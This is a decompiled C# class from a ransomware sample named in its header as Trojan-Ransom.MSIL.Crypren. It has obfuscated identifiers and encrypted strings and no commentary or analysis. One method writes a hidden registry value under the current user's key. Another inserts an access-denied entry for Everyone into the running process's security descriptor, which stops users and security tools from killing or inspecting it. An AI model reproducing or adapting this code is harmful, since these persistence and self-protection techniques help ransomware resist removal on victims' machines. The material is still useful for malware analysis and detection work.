// Decompiled with JetBrains decompiler
// Type: zvenNXaGjQywAfJS.jUuEbMgtQaePX
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A95A28D5-8216-4857-B945-01900B674D16
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Crypren.gen-8a4a038a965ba42a0442d44abf25e4d21f5049d4a4a8aa9cb6691ec4282814a1.exe

using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace zvenNXaGjQywAfJS
{
  internal sealed class jUuEbMgtQaePX
  {
    [NonSerialized]
    internal static GetString \u0090;

    [DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
    private static extern bool sdFzzepIlTrg(
      IntPtr RjqdPhzbeMQ,
      int cjhbavGczAvCG,
      [Out] byte[] qgfymXJztwKkIWrl,
      uint HxbIpPZffwnl,
      out uint qwKkGGoGMSiV);

    [DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
    private static extern bool JjAtfSdzPLy(
      IntPtr fnIWWJnbPGp,
      int DlbrQXBEYaZkl,
      [In] byte[] pjwUmhENjBZ);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    private static extern IntPtr pMZNVAMQKm();

    public void hOXwxuRwzcLLRuS([In] bool obj0)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(AFNAiOPxfKG.KfBmpaPpRy(jUuEbMgtQaePX.\u0090(107409271)));
        subKey.SetValue(AFNAiOPxfKG.KfBmpaPpRy(jUuEbMgtQaePX.\u0090(107409166)), (object) jUuEbMgtQaePX.\u0090(107410383));
        subKey.Close();
      }
      catch
      {
      }
    }

    private RawSecurityDescriptor hJaMYENfSGELgR([In] IntPtr obj0)
    {
      byte[] qgfymXJztwKkIWrl = new byte[0];
      uint qwKkGGoGMSiV;
      jUuEbMgtQaePX.sdFzzepIlTrg(obj0, 4, qgfymXJztwKkIWrl, 0U, out qwKkGGoGMSiV);
      if (qwKkGGoGMSiV < 0U || qwKkGGoGMSiV > (uint) short.MaxValue)
        return (RawSecurityDescriptor) null;
      byte[] binaryForm;
      return !jUuEbMgtQaePX.sdFzzepIlTrg(obj0, 4, binaryForm = new byte[(IntPtr) qwKkGGoGMSiV], qwKkGGoGMSiV, out qwKkGGoGMSiV) ? (RawSecurityDescriptor) null : new RawSecurityDescriptor(binaryForm, 0);
    }

    private void HMrEkXUvSJxqsx([In] IntPtr obj0, [In] RawSecurityDescriptor obj1)
    {
      byte[] numArray = new byte[obj1.BinaryLength];
      obj1.GetBinaryForm(numArray, 0);
      jUuEbMgtQaePX.JjAtfSdzPLy(obj0, 4, numArray);
    }

    public void vFZDkcLwhbcA()
    {
      try
      {
        IntPtr num = jUuEbMgtQaePX.pMZNVAMQKm();
        RawSecurityDescriptor securityDescriptor = this.hJaMYENfSGELgR(num);
        securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        this.HMrEkXUvSJxqsx(num, securityDescriptor);
      }
      catch (Exception ex)
      {
      }
    }

    static jUuEbMgtQaePX() => Strings.CreateGetStringDelegate(typeof (jUuEbMgtQaePX));
  }
}
